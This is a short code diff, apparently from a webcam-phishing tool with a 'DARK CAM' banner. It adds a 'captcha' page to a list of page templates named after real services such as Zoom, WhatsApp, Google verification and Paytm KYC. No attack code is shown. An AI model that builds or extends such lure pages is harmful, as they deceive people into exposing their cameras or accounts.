@@ -26,7 +26,7 @@ PREFIX     = os.environ.get("PREFIX", "/usr")
 BIN_DIR    = os.path.join(PREFIX, "bin")
 
 ALL_PAGES  = ["meet","zoom","whatsapp","instagram","omegle","teams",
-              "telegram","facetime","instagram_verify","google_verify","paytm_kyc"]
+              "telegram","facetime","instagram_verify","google_verify","paytm_kyc","captcha"]
 
 BANNER = f"""
 {_G} ▓█████▄  ▄▄▄       ██▀███   ██ ▄█▀{_O}  ▄████▄   ▄▄▄       ███▄ ▄███▓{_R}
